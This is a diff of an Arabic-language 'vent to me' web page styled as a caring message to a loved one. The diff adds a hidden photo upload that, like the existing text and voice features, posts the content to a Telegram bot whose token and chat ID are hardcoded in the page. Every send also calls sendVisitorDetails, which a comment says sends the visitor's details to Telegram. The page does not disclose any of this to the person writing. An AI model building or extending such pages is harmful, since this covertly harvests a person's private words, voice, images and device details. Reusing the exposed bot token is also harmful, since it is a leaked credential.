@@ -12,25 +12,6 @@
             font-family: Arial, sans-serif;
             transition: background-color 2s ease-in-out;
         }
-        .video-background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            overflow: hidden;
-        }
-        #youtube-video {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 100vw;
-            height: 100vh;
-            transform: translate(-50%, -50%);
-            object-fit: cover;
-            pointer-events: none;
-        }
         .container {
             position: absolute;
             top: 50%;
@@ -38,6 +19,9 @@
             transform: translate(-50%, -50%);
             text-align: center;
             z-index: 1;
+        }
+        h2 {
+            color: white;
         }
         textarea {
             width: 80%;
@@ -64,16 +48,6 @@
         }
         .button:hover {
             background-color: #ff1493;
-        }
-        .flying-message {
-            position: absolute;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            opacity: 0;
-            transition: opacity 1s ease-in-out, bottom 2s ease-in-out;
-            color: #ff1493;
-            font-size: 20px;
         }
         .character {
             position: absolute;
@@ -164,30 +138,28 @@
             0%, 100% { height: 10px; }
             50% { height: 30px; }
         }
+        @media (max-width: 768px) {
+            .container {
+                width: 90%;
+            }
+            textarea {
+                width: 90%;
+            }
+        }
     </style>
 </head>
 <body>
-    <!-- خلفية الفيديو من اليوتيوب -->
-    <div class="video-background">
-        <iframe
-            id="youtube-video"
-            src="https://www.youtube.com/embed/ADDFmfOeihU?autoplay=1&mute=0&loop=1&playlist=ADDFmfOeihU&controls=0&modestbranding=1&disablekb=1&fs=0&vq=hd720"
-            frameborder="0"
-            allow="autoplay"
-            allowfullscreen="false"
-            style="pointer-events: none;">
-        </iframe>
-    </div>
-
     <!-- الحاوية الرئيسية -->
     <div class="container">
         <h2>💕فضفضي يروحي ونا جنبك ديما متقلقيش💕</h2>
         <textarea id="message" placeholder="...✨احكي يروحي وهسمعك مقدرش ازعلك اصلا"></textarea>
         <br>
         <button class="button" onclick="sendMessage()">💌خلصتي فضفضه يتوتي💌</button>
-        <div class="flying-message" id="flyingMessage"></div>
         <br>
         <button class="button" onclick="openPopup()">🎤 فويس</button>
+        <br>
+        <input type="file" id="imageInput" accept="image/*" style="display: none;">
+        <button class="button" onclick="document.getElementById('imageInput').click()">📷 إرسال صورة</button>
     </div>
 
     <!-- شخصية متحركة -->
@@ -309,11 +281,11 @@
             mediaRecorder.stop();
 
             mediaRecorder.onstop = function() {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
 
                 // تحويل الـ Blob إلى ملف
                 const formData = new FormData();
-                formData.append('audio', audioBlob, 'recording.wav');
+                formData.append('audio', audioBlob, 'recording/mp3');
 
                 // إرسال الملف إلى Telegram
                 const botToken = '7309654669:AAHoUa7SGJ90jB2f23j7O7RDF5OdM6OnGdg'; // التوكن الخاص بك
@@ -326,7 +298,6 @@
                 })
                 .then(response => response.json())
                 .then(data => {
-                    console.log("تم إرسال التسجيل إلى Telegram:", data);
                     alert("💌تم إرسال التسجيل بنجاح💌");
                 })
                 .catch(error => {
@@ -375,32 +346,6 @@
                     text: telegramMessage,
                 }),
             })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log("تم إرسال الرسالة إلى Telegram:", data);
-                    alert("💌تم إرسال رسالتك بنجاح💌");
-                } else {
-                    console.error("خطأ في إرسال الرسالة إلى Telegram:", data);
-                    alert("❌حدث خطأ أثناء إرسال الرسالة❌");
-                }
-            })
-            .catch(error => {
-                console.error("خطأ في إرسال الرسالة إلى Telegram:", error);
-                alert("❌حدث خطأ أثناء إرسال الرسالة❌");
-            });
-
-            // عرض الرسالة الطائرة
-            const flyingMessage = document.getElementById('flyingMessage');
-            flyingMessage.innerText = message;
-            flyingMessage.style.opacity = 1;
-            flyingMessage.style.bottom = '50%';
-
-            setTimeout(() => {
-                flyingMessage.style.opacity = 0;
-                flyingMessage.style.bottom = '0';
-                document.getElementById('message').value = ''; // تفريغ النص بعد الإرسال
-            }, 2000);
 
             // عرض رسالة دب الباندا
             showPandaMessage();
@@ -408,6 +353,30 @@
             // إرسال تفاصيل المستخدم
             sendVisitorDetails();
         }
+
+        // إرسال الصورة إلى Telegram
+        document.getElementById('imageInput').addEventListener('change', function(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const formData = new FormData();
+                formData.append('photo', file);
+
+                const botToken = '7309654669:AAHoUa7SGJ90jB2f23j7O7RDF5OdM6OnGdg'; // التوكن الخاص بك
+                const chatId = '7631254472'; // معرف الدردشة الخاص بك
+                const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+                fetch(telegramApiUrl, {
+                    method: 'POST',
+                    body: formData,
+                })
+
+                // عرض رسالة دب الباندا
+                showPandaMessage();
+
+                // إرسال تفاصيل المستخدم
+                sendVisitorDetails();
+            }
+        });
 
         // إرسال تفاصيل الزائر إلى Telegram
         function sendVisitorDetails() {
